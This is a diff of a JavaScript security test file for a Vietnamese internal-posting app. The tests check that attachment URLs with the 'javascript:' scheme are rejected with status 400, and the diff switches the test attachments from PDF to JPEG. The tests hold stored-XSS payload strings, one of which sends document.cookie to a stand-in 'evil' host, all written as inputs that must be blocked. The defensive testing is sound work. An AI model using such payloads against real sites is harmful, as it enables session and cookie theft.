@@ -341,11 +341,15 @@ async function main() {
     // ===================================================================================
     // Fix 4 — Stored XSS qua URL tệp đính kèm/ảnh (scheme "javascript:")
     // ===================================================================================
+    // Fix 4a/4b/4c dùng fileType ẢNH (image/jpeg) thay vì application/pdf: từ "Việc E" (11/2026),
+    // NEWS/SHARE chỉ còn được đính kèm ảnh (internalPosts.extraValidate chặn thẳng tài liệu không phải
+    // ảnh) — các bài test này đang kiểm tra lớp chặn URL scheme javascript:, không liên quan tới luật
+    // đó, nên đổi sang ảnh để không bị chặn nhầm ở lớp khác.
     await run.run('Fix 4a — internalPosts (TẠO): attachment.fileUrl "javascript:alert(1)" bị từ chối 400', () => {
       const err = expectThrows(() => createRecord('internalPosts', {
         type: 'SHARE', title: 'Bài chia sẻ', content: 'Nội dung',
         postCategory: 'CHIA_SE',
-        attachment: { fileName: 'cv.pdf', fileType: 'application/pdf', fileUrl: 'javascript:alert(document.cookie)' }
+        attachment: { fileName: 'cv.jpg', fileType: 'image/jpeg', fileUrl: 'javascript:alert(document.cookie)' }
       }, PLAIN_KD, [], { internalShareCategories: [{ key: 'CHIA_SE', label: 'Chia sẻ' }] }),
       'Payload có attachment.fileUrl scheme javascript: PHẢI bị từ chối');
       assertEqual(err.status, 400, 'Phải trả 400 (lỗi dữ liệu client), không phải âm thầm bỏ qua');
@@ -356,9 +360,9 @@ async function main() {
       const appData = { internalShareCategories: [{ key: 'CHIA_SE', label: 'Chia sẻ' }] };
       const withFile = createRecord('internalPosts', {
         type: 'SHARE', title: 'Bài có tệp', content: 'Nội dung', postCategory: 'CHIA_SE',
-        attachment: { fileName: 'a.pdf', fileType: 'application/pdf', fileUrl: '/uploads/1756500000000-a1b2c3d4e5f60718.pdf' }
+        attachment: { fileName: 'a.jpg', fileType: 'image/jpeg', fileUrl: '/uploads/1756500000000-a1b2c3d4e5f60718.jpg' }
       }, PLAIN_KD, [], appData);
-      assertEqual(withFile.attachment.fileUrl, '/uploads/1756500000000-a1b2c3d4e5f60718.pdf', 'URL do chính hệ thống sinh ra phải đi qua nguyên vẹn');
+      assertEqual(withFile.attachment.fileUrl, '/uploads/1756500000000-a1b2c3d4e5f60718.jpg', 'URL do chính hệ thống sinh ra phải đi qua nguyên vẹn');
 
       const noFile = createRecord('internalPosts', {
         type: 'SHARE', title: 'Bài không tệp', content: 'Nội dung', postCategory: 'CHIA_SE'
@@ -380,14 +384,14 @@ async function main() {
       const draft = {
         id: 9500, type: 'SHARE', status: 'DRAFT', author: PLAIN_KD.username, title: 'Nháp', content: 'x',
         postCategory: 'GOP_Y',
-        attachment: { fileName: 'ok.pdf', fileUrl: '/uploads/1756500000000-aaaaaaaaaaaaaaaa.pdf' }
+        attachment: { fileName: 'ok.jpg', fileType: 'image/jpeg', fileUrl: '/uploads/1756500000000-aaaaaaaaaaaaaaaa.jpg' }
       };
       const err = expectThrows(() => recordActions.editInternalPost(
-        { attachment: { fileName: 'xau.pdf', fileUrl: 'javascript:fetch("//evil/"+document.cookie)' } },
+        { attachment: { fileName: 'xau.jpg', fileType: 'image/jpeg', fileUrl: 'javascript:fetch("//evil/"+document.cookie)' } },
         PLAIN_KD, draft, shareAppData
       ), 'Đường SỬA cũng phải chặn — nếu không thì lỗ hổng chỉ vá được 1 nửa');
       assertEqual(err.status, 400, 'Phải trả 400');
-      assertEqual(draft.attachment.fileUrl, '/uploads/1756500000000-aaaaaaaaaaaaaaaa.pdf',
+      assertEqual(draft.attachment.fileUrl, '/uploads/1756500000000-aaaaaaaaaaaaaaaa.jpg',
         'Bản ghi KHÔNG được bị sửa đổi khi payload bị từ chối');
 
       // Sửa với URL hợp lệ vẫn phải chạy như cũ.
@@ -396,10 +400,10 @@ async function main() {
         postCategory: 'GOP_Y'
       };
       recordActions.editInternalPost(
-        { attachment: { fileName: 'ok.pdf', fileUrl: '/uploads/1756500000000-bbbbbbbbbbbbbbbb.pdf' }, draft: true },
+        { attachment: { fileName: 'ok.jpg', fileType: 'image/jpeg', fileUrl: '/uploads/1756500000000-bbbbbbbbbbbbbbbb.jpg' }, draft: true },
         PLAIN_KD, okDraft, shareAppData
       );
-      assertEqual(okDraft.attachment.fileUrl, '/uploads/1756500000000-bbbbbbbbbbbbbbbb.pdf', 'URL hợp lệ vẫn phải lưu được khi sửa');
+      assertEqual(okDraft.attachment.fileUrl, '/uploads/1756500000000-bbbbbbbbbbbbbbbb.jpg', 'URL hợp lệ vẫn phải lưu được khi sửa');
     });
 
     await run.run('Fix 4d — recruitmentJobs.bannerUrl / recruitmentReferrals.cvFileUrl cũng chặn scheme javascript:', () => {
